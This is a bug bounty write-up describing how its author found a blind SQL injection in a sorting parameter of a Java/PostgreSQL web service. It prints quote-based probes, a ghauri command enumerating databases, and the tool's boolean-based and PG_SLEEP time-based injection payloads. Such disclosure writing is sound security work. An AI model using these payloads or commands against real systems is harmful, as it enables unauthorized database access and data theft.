---
title: How I Got My First €€€€ Bounty
categories: [BugBounty]
tags: [BugBounty, Infosec, SQL Injection, sqlmap]
image:
  path: /assets/img/First_€€€€/main.webp
---

## سَلامٌ

I'll share In this write-up how I discovered my first €€€€ bounty.

At first, I started with a basic manual recon because the program scope was just a set of URLs related to different services, for example:

- `https://ex.admin.service.example.com/`
- `https://ex.service.service.example.com/`
- `https://ex.abc.service.example.com/`

Also, the program provided credentials to test roles.

Then I browsed the sites while proxying the traffic through Burp and testing the functionalities like any normal user, but there were no interesting functionalities except the sorting one, I noticed some interesting parameters
I already saw In some *JS* files the parameters were:

`SelectedSources` and `SelectedTemplateNames` at first I thought maybe It grabs some data from the database, so I decided to test It with some special characters
searching for anomalies like `{", ' , \}`, and when I entered a single quote I got 500 HTTP status code `(Internal server error)` then added another single quote I got 200 HTTP status code (OK).

```
https://ex.service.example.com/history?selectedSources=someSources' > 500

https://ex.service.example.com/history?selectedSources=someSources'' > 200
```

Sometimes, I enter backslash to confirm It, but here I got 400 bad request `(It was a Java app runs on Apache tomcat so you should encode the backslash to %5c)`.

`https://ex.service.example.com/history?selectedSources=someSources\' > 400`

After that, I tried to run `sqlmap` to extract the database version but unfortunately, `sqlmap` didn’t extract anything except the DBMS was `PostgreSQL`, but I didn’t give up and used `ghauri` instead `https://github.com/r0oth3x49/ghauri.git`

```terminal
ghauri -u "https://ex.service.example.com/history?selectedSources=someSources" --dbms=postgres --cookie="JSESSIONID=09326D266052B6B0F7E391B7BBD3A284" --dbs
```

*BooM!*

```
[09:22:32] [INFO] testing connection to the target URL
Ghauri resumed the following injection point(s) from stored session:                                                                                                                                                                                                                                         
Parameter: selectedSources (GET)                                                                                                                                                                                                            
    Type: boolean-based blind                                                                                                                                                                                                               
    Title: OR boolean-based blind - WHERE or HAVING clause                                                                                                                                                                                  
    Payload: selectedSources=someSources') OR 06690=6690 OR ('04586'='4586                                                                                                                                                                      

    Type: time-based blind                                                                                                                                                                                                                  
    Title: PostgreSQL > 8.1 AND time-based blind (comment)                                                                                                                                                                                  
    Payload: selectedSources=someSources') AND 4564=(SELECT 4564 FROM PG_SLEEP(6)) OR ('04586'='4586                                                                                                                                                                                                                                                                                                                                                                             
[09:22:33] [INFO] testing PostgreSQL
[09:22:34] [INFO] confirming PostgreSQL
[09:22:34] [INFO] the back-end DBMS is PostgreSQL
[09:22:34] [INFO] fetching database names
[09:22:34] [INFO] fetching number of databases
[09:22:51] [INFO] retrieved: 3
[09:26:01] [INFO] retrieved: information_schema
[09:27:51] [INFO] retrieved: pg_catalog
[09:28:57] [INFO] retrieved: public
available databases [3]:
[*] pg_catalog
[*] public
[*] information_schema
```

I reported It and In just one hour the triager forwarded the report to the company, and they acknowledged the vulnerability.

![main](/assets/img/First_€€€€/main.webp)

The next day, the company awarded me a bounty.

![accepted](/assets/img/First_€€€€/accepted.webp)

*In the end, do not stick to just one tool, technique, or even a program that you don’t understand; that will burn you out. The internet is already a place filled with vulnerabilities.*

Twitter/X: https://x.com/MachIaVellill

## سَلامٌ
